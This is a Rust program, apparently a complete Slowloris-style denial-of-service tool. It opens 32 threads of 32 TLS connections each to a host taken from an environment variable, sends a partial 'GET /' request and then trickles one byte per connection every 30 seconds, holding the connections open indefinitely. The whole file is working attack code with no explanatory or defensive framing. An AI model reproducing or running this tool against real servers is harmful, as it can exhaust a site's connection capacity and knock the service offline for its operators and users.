extern crate native_tls;
use native_tls::TlsConnector;
use std::env;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

fn main() {
    let host = env::var("HOST").unwrap();
    let port = "443";
    let threads_count = 32;
    let connections_count = 32;

    let mut threads = Vec::with_capacity(threads_count);
    for thread_number in 0..threads_count {
        let host = host.clone();
        let connections_count = connections_count.clone();
        let thread = thread::spawn( move || {
            let mut streams = Vec::with_capacity(connections_count);
            let mut progresses = Vec::with_capacity(connections_count);
            for connection_number in 0..connections_count {
                let connector = TlsConnector::builder().unwrap().build().unwrap();
                let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
                let mut stream = connector.connect(&host, stream).unwrap();
                let mut progress = String::new();
                let start = "GET /";
                progress.push_str(&start);
                stream.write(start.as_bytes());
                streams.push(stream);
                progresses.push(progress);
            }

            loop {
                thread::sleep(Duration::from_secs(30));
                let symbol = "a";
                for connection_number in 0..connections_count {
                    streams[connection_number].write(symbol.as_bytes());
                    streams[connection_number].flush();
                    progresses[connection_number].push_str(&symbol);
                    println!("[Thread: {}][Thread Connection: {}][Written: {}]", thread_number, connection_number, progresses[connection_number]);
                }
            }
        });
        threads.push(thread);
    }
    for thread in threads {
        let _ = thread.join();
    }
}